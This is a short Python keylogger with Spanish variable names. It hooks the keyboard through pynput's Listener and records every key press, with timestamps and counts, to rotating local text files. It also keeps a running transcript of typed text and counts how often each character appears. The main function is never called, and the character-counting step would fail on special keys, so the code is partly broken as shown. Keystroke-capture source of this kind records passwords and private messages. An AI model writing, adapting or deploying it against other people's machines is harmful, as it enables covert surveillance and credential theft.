import datetime
from pynput.keyboard import Listener
from io import open


def obtenerfh():
    return datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
Fecha_hoy=obtenerfh()
Fecha_hoy2=obtenerfh()
milista = []

cont_letras=0
cont_lote=1
global cont
cont=[]

for i in range (200):
    cont.append(0)


def imprimir_linea(archivo,key,fecha,n):
    n=str(n)
    if key == "Key.space":
        key=" "
    elif key == "Key.alt_l":
        key="ALT"

    archivo.write("Caracter "+key+" fecha y hora "+fecha+" ----->total "+n+"\n")

def escribir(letra,archivo):
    if letra == "Key.enter":
        archivo.write("\n")
    elif letra == "Key.space":
        archivo.write(" ")
    elif letra == "Key.alt_l":
        archivo.write("ALT")
    elif letra == "Key.backspace":
        archivo.write("%BORRAR%")
    else:
        archivo.write(letra.replace("'", ""))

def corregir(teclado):
    if len(teclado)==3:
        res=teclado[1]
    else:
        res = teclado.replace("'", "")
    return res

def contar(letra):
    letra=corregir(letra)
    num=ord(letra)
    cont[num]+=1

def Recibirtecla(key):
    global Fecha_hoy
    global cont_letras
    global cont_lote
    global fichero
    fichero = open(f"informacion_"+Fecha_hoy+".txt", "a")
    fichero2=open(f"informacion_total_"+Fecha_hoy2+".txt", "a")
    fecha_instante=obtenerfh()
    key = str(key)
    contar(key)
    cont_letras+=1

    imprimir_linea(fichero,key,fecha_instante,cont_letras)
    escribir(key,fichero2)
    milista.append(key)

    if cont_letras == 20:
        cont_lote += 1

        fichero.close()
        fecha = obtenerfh()

        fichero = open(f"informacion_{fecha}.txt", "a")
        Fecha_hoy=fecha
        cont_letras = 0




def main():
    with Listener(on_press=Recibirtecla) as l:
        l.join()

    print(cont[97])
